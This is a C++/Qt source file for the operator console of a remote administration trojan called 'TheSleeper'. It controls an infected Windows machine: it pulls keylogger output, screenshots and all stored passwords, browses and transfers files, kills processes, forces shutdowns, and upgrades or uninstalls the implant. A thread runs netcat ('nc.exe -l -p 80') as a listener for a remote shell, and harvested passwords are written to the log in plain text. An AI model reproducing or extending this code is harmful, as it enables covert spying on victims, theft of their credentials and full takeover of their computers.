#include <exception>
#include <string>
#include <sstream>
using namespace std;
#include <QThread>
#include <QWaitCondition>
#include <QTextStream>
#include <QMessageBox>
#include "Client.hpp"
#include <common/Logger.hpp>
#include <system/File.hpp>
#include <blaspheme/Blaspheme.hpp>
using namespace Blaspheme;

namespace TheSleeper
{
    QWaitCondition stream_associated;
    QMutex stream_mutex;

    class RemoteShellController : public QThread
    {
        public:
            void run()
            {
                system("nc.exe -l -p 80");
            }
    };
    
    void Client::disconnect()
    {
		LOG << "Reset des connexions.";
		session.reset();
		status = tr("Deconnected");
	}

    QString Client::getRemoteSystemVersion()
    {
        try
        {
            session << GET_WINDOWS_VERSION;
            string buffer;
            session >> buffer;
            return QString(buffer.c_str());
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
		return "Undefined System";
    }

    void Client::updateProcessList()
    {
        try
        {
            session << GET_PROCESSLIST;
            string buffer;
            processes.clear();
            for(;;)
            {
                session >> buffer;
                if(buffer == FINISHED)
                {
                    break;
                }
                processes << buffer.c_str();
            }
            processes.sort();
        }
		catch(Network::SocketException& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue";
            emit disconnected();
        }
    }

    void Client::killProcess(QString process)
    {
        try
        {
            session << KILL_PROCESS;
            session << process.toStdString();

            string buffer;
            session >> buffer;
            if(buffer == FAILURE)
            {
                LOG << "Impossible de tuer le processus "+process.toStdString();
            }
            else
            {
                updateProcessList();
            }
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue";
            emit disconnected();
        }
    }

    void Client::remoteShell()
    {
        try
        {
            // on verifie si netcat existe :
            ifstream netcat(SHELL_PROGRAM, std::ios::binary);
            if(!netcat)
            {
                LOG << "Impossible de trouver l'executable de Netcat.";
            }
            else
            {
                emit remoteShellState(true);
                session << REMOTE_SHELL;
				RemoteShellController shell;
				shell.start();
				shell.wait();
                emit remoteShellState(false);
            }
        }
		catch(Network::SocketException& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue";
            emit disconnected();
        }
    }

    void Client::updateScreen(int quality, QProgressBar * bar)
    {
        try
        {
            session << GET_SCREEN;
            LOG << "Qualite du screenshot a recevoir : "+to_string(quality);
            session << to_string(quality);
            string buffer_photo;
            InMemoryDownload download(buffer_photo, session.stream());
            download.addObserver(new GraphicProgressBar(bar));
			download.launch();
			LOG << "Taille de la photo : " + to_string(buffer_photo.size());
			if(screen.loadFromData((const unsigned char *)buffer_photo.c_str(), buffer_photo.size()))
			{
				LOG << "Chargement de l'image OK.";
			}
			else
			{
				LOG << "Impossible de charger l'image.";
			}
			LOG << "Format de l'image : " + to_string(screen.width()) + "x" + to_string(screen.height());
		}
        catch(FileNotFound& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(ReadingError& e)
        {
            LOG << e.what();
            emit disconnected();
        }
		catch(Network::Deconnection& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
    }

    void Client::remoteShutdown()
    {
        try
        {
            session << SHUTDOWN;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";

        }
        emit disconnected();
    }

    void Client::remoteReboot()
    {
        try
        {
            session << REBOOT;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
    }

    void Client::remoteLogout()
    {
        try
        {
            session << LOGOUT;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
        emit disconnected();
    }

    void Client::remoteHibernate()
    {
        try
        {
            session << HIBERNATE;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
        emit disconnected();
    }

    void Client::reboot()
    {
        try
        {
            session << REBOOT_CLIENT;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
        emit disconnected();
    }

    void Client::shutdown()
    {
        try
        {
            session << KILL_CLIENT;
        }
        catch(exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
        emit disconnected();
    }

    void Client::upgrade(QString server_filename, QProgressBar * bar)
    {
        try
        {
            session << UPGRADE_CLIENT;
            
            string answer;
            session >> answer;
            
            if(answer == SUCCESS)
            {
                Upload upload(server_filename.toStdString(), session.stream());
                upload.launch();
                //reboot();
                QMessageBox::information(0, tr("Mise a jour"), tr("Le client a ete mis a jour. Redemarrer le client pour prendre en compte les modifications."));
            }
            else
            {
                LOG << "Impossible de mettre a jour le client.";
                QMessageBox::critical(0, tr("Probleme"), tr("Impossible de mettre a jour le client"));
            }
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
    }

    void Client::uninstall()
    {
        try
        {
            session << UNINSTALL_CLIENT;
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
        }
        emit disconnected();
    }

    void Client::updateKeylog(QProgressBar * bar)
    {
        remove(LOG_PATH_DOWNLOAD);
        try
        {
            string answer;
            
            session << GET_LOGFILE;
            session >> answer;
            if(answer == KEYLOG_EMPTY)
            {
                current_keylog = "Fichier log vide.";
                return;
            }
            
            string keylog_buffer;
            InMemoryDownload download(keylog_buffer, session.stream());
            download.addObserver(new GraphicProgressBar(bar));
            download.launch();
            current_keylog.clear();
            current_keylog.append(keylog_buffer.c_str());
        }
        catch(RemoteFileNotFound&)
        {
            LOG << "Impossible de trouver le fichier distant.";
        }
        catch(LocalFileNotFound&)
        {
            LOG << "Impossible d'écrire dans le fichier local.";
        }
        catch(FileNotFound&)
        {
            LOG << "Fichier introuvable.";
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
    }

    QStandardItemModel& Client::updateLogicalVolumes()
    {
        try
        {
            LOG << "Mise a jour des lecteurs racines.";
            remote_files.clear();
            
            session << BROWSE_FILES;
            session << "\\";
            string logical_volume;

            for(;;)
            {
                session >> logical_volume;
                if(logical_volume == FINISHED)
                {
                    break;
                }
                
                QStandardItem * item = new QStandardItem(QString(logical_volume.c_str()));
                item->setIcon(iprov.icon(QFileIconProvider::Drive));
                remote_files.appendRow(item);
            }
            LOG << "Fin de mise a jour des lecteurs racines.";
        }
        catch(exception& e)
        {
            QMessageBox::information(0, "TheSleeper", e.what());
            disconnect();
        }
        catch(...)
        {
            QMessageBox::information(0, "TheSleeper",tr("Erreur d'origine inconnue."));
        }
		return remote_files;
    }

    bool Client::browseFiles(QModelIndex current_index)
    {
        try
        {
            QString file = remote_files.data(current_index).toString();
            if(!file.size())
                return true;

            // si c'est un fichier qui a été selectionné, ne rien faire
            if(file[file.size()-1] != '\\')
            {
                LOG << "Ce n'est pas un dossier qui a ete selectionne.";
                return true;
            }
            
            // c'est un dossier mais a-t-il déja été listé ?
            if(remote_files.hasChildren(current_index))
            {
                LOG << "Le dossier selectionne a deja ete liste.";
                return true;
            }
            
            QString path = getRemotePath(current_index);
            LOG << "Dossier a lister : " + path.toStdString();
            
            session << BROWSE_FILES;
            session << path.toStdString();
            string listing;
            
            QStandardItem * current_item = remote_files.itemFromIndex(current_index);
            QList<QStandardItem *> item_list;
            
            for(;;)
            {
                session >> listing;
                if(listing == FAILURE)
                {
                    LOG << "Impossible de lister ce repertoire.";
                    return false;
                }
                if(listing == FINISHED)
                {
                    break;
                }
                QStandardItem * item = new QStandardItem(QString(listing.c_str()));
    
                // on detecte si c'est un repertoire en regardant le dernier caractere du fichier
                // s'il y a un slash, alors c'est un repertoire et donc on met a l'item l'icone
                // associé à un repertoire
                if(listing[listing.size()-1] == '\\')
                {
                    item->setIcon(iprov.icon(QFileIconProvider::Folder));
                }
                else
                {
                    item->setIcon(iprov.icon(QFileIconProvider::File));
                }
                item_list.push_back(item);
            }
            current_item->insertRows(0, item_list);
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
		return true;
    }

    QString Client::getRemotePath(QModelIndex current_index)
    {
        QModelIndex current = current_index;
        QString path;
        while(current != QModelIndex())
        {
            path.push_front(remote_files.data(current).toString());
            current = current.parent();
        }
        return path;
    }

    void Client::startDownload(QString& source, QString& destination, QProgressBar * bar)
    {
        try
        {
            LOG << "Source : " + source.toStdString() + "  et destination : " + destination.toStdString();
            session << START_DOWNLOAD;
            session << source.toStdString();
            Download transfer(destination.toStdString(), session.stream());
            transfer.addObserver(new GraphicProgressBar(bar));
            transfer.launch();
        }
        catch(Blaspheme::FileNotFound&)
        {
            LOG << "Impossible de creer le fichier de destination : "+destination.toStdString();
            emit disconnected();
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
    }

    void Client::startUpload(QString& source, QString& destination, QProgressBar * bar)
    {
        try
        {
            LOG << "Source : "+source.toStdString()+ "  et destination : " + destination.toStdString();
            session << START_UPLOAD;
			session << destination.toStdString();
            
            Upload transfer(source.toStdString(), session.stream());
            transfer.addObserver(new GraphicProgressBar(bar));
            transfer.launch();
		}
        catch(Blaspheme::FileNotFound&)
        {
            LOG << "Impossible de creer le fichier de destination : "+destination.toStdString();
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Erreur d'origine inconnue.";
            emit disconnected();
        }
    }


	void Client::updateSystemVersion()
	{
		session << GET_WINDOWS_VERSION;
		string buffer;
		session >> buffer;
		system_version = buffer.c_str();
		LOG << "Version du systeme d'exploitation : " + buffer;
	}

	void Client::updateClientName()
	{
		session << GET_CLIENT_NAME;        
		LOG << "Attente du nom du client...";
		string buffer;
		session >> buffer;
		name = buffer.c_str();
		LOG << "Nom du client : " + buffer;
	}

	void Client::updatePasswords()
	{
		session << PASSWORDS_GETALL;
		LOG << "Attente des mots de passe du client...";
		string buffer;
		session >> buffer;
		if(buffer == FINISHED)
		{
			return;
		}
		LOG << "Mots de passes recuperes : " + buffer;
		// on decoupe la chaine a l'aide du delimiteur
		std::istringstream iss(buffer);
		string cred;
		while ( std::getline( iss, cred, ',' ) )
		{
			LOG << "Ajout du mot de passe : " + cred;
			stored_passwords << cred.c_str();
		}		
	}

} /* TheSleeper */
